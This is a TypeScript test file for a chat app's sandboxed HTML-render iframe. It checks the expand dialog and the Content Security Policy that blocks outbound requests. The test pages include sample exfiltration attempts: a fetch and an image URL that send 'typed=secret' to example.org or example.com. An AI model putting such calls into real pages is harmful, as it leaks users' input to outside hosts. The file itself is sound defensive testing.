/** @jsxImportSource solid-js */
import { CachesContext } from '@session-chat/components/contexts/CachesContext';
import { ThemeContext } from '@session-chat/components/contexts/ThemeContext';
import { htmlRenderBlockDef } from '@session-chat/components/rows/markdown/html-render/html-render.def';
import { htmlRenderDocument, keepHtmlRenderPage } from '@session-chat/core/html-render/page';
import type { HtmlRenderBlock } from '@session-chat/core/markdown/document';
import { parseMarkdownToBlocks } from '@session-chat/core/markdown/parse';
import { makeContractCtx } from '@session-chat/tests/contract';
import { render } from 'solid-js/web';
import { afterEach, describe, expect, it } from 'vitest';
import { until } from '../../../../tests/support/awaitCondition';

let dispose: (() => void) | undefined;
let root: HTMLDivElement | undefined;
afterEach(() => { dispose?.(); root?.remove(); });

describe('html-render page expand', () => {
  it('opens the page over the window inside the chat root, and closes on Escape and on the close button', () => {
    const block = parseMarkdownToBlocks('t', '```html-render\n<div>bars</div>\n```')[0] as HtmlRenderBlock;
    const ctx = makeContractCtx({ width: 480 });
    const measured = htmlRenderBlockDef.measure(block, ctx);
    root = document.createElement('div');
    root.setAttribute('data-chat-root', '');
    root.style.position = 'relative';
    document.body.appendChild(root);
    const Render = htmlRenderBlockDef.Render;
    dispose = render(() => (
      <ThemeContext.Provider value={() => ctx.theme}>
        <CachesContext.Provider value={ctx.caches}>
          <Render node={measured} />
        </CachesContext.Provider>
      </ThemeContext.Provider>
    ), root);

    const dialog = () => root!.querySelector('[role="dialog"]');
    expect(root.querySelectorAll('iframe')).toHaveLength(1);
    expect(dialog()).toBeNull();

    root.querySelector<HTMLButtonElement>('button[aria-label="Expand"]')!.click();
    expect(dialog()).not.toBeNull();
    expect(getComputedStyle(dialog()!.parentElement!).position).toBe('fixed');
    // Both frames are the same opaque sandbox, never one with more rights.
    expect([...root.querySelectorAll('iframe')].map((frame) => frame.getAttribute('sandbox'))).toEqual(['allow-scripts', 'allow-scripts']);

    window.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }));
    expect(dialog()).toBeNull();

    root.querySelector<HTMLButtonElement>('button[aria-label="Expand"]')!.click();
    dialog()!.querySelector<HTMLButtonElement>('button[aria-label="Close"]')!.click();
    expect(dialog()).toBeNull();
  });
});

/** The page in a sandboxed frame, as both renderers draw it; returns every probe message it posts. */
function mountPage(page: string, keep = false) {
  const seen: { probe: string; directive?: string }[] = [];
  const onMessage = (event: MessageEvent) => {
    if (event.data?.probe) seen.push(event.data);
  };
  window.addEventListener('message', onMessage);
  const frame = document.createElement('iframe');
  frame.setAttribute('sandbox', 'allow-scripts');
  const unkeep = keep ? keepHtmlRenderPage(frame) : undefined;
  frame.srcdoc = htmlRenderDocument(page, '');
  root = document.createElement('div');
  root.appendChild(frame);
  document.body.appendChild(root);
  dispose = () => {
    unkeep?.();
    window.removeEventListener('message', onMessage);
  };
  return seen;
}

const REPORT_VIOLATIONS = `document.addEventListener('securitypolicyviolation', (e) => parent.postMessage({ probe: 'csp', directive: e.effectiveDirective }, '*'));`;

describe('html-render page policy', () => {
  // Violation events, not failed requests: CI may have no network, and only the policy names the directive.
  it("blocks the page's own fetch, so what a reader types cannot be sent anywhere", async () => {
    const seen = mountPage(`<script>${REPORT_VIOLATIONS}
fetch('https://example.org/collect?typed=secret').then(() => parent.postMessage({ probe: 'sent' }, '*'), () => parent.postMessage({ probe: 'rejected' }, '*'));
</script>`);
    await until('the page reports its fetch', () => seen.some((m) => m.probe === 'rejected' || m.probe === 'sent'));
    await until('the policy reports the violation', () => seen.some((m) => m.probe === 'csp'));
    expect(seen.find((m) => m.probe === 'csp')?.directive).toBe('connect-src');
    expect(seen.some((m) => m.probe === 'sent')).toBe(false);
  });

  it('blocks an image from a host outside the three CDNs, so a URL cannot carry it either', async () => {
    const seen = mountPage(`<script>${REPORT_VIOLATIONS}</script><img src="https://example.com/x.png?typed=secret">`);
    await until('the policy reports the image', () => seen.some((m) => m.probe === 'csp'));
    expect(seen.find((m) => m.probe === 'csp')?.directive).toBe('img-src');
  });

  it('puts a frame that navigated away back on its own page', async () => {
    // Each load says hello, then leaves; a second hello means the frame came back to the page.
    const seen = mountPage(`<script>parent.postMessage({ probe: 'hello' }, '*'); setTimeout(() => { location.href = 'about:blank'; }, 20);</script>`, true);
    await until('the page loads again after leaving', () => seen.filter((m) => m.probe === 'hello').length >= 2);
  });
});
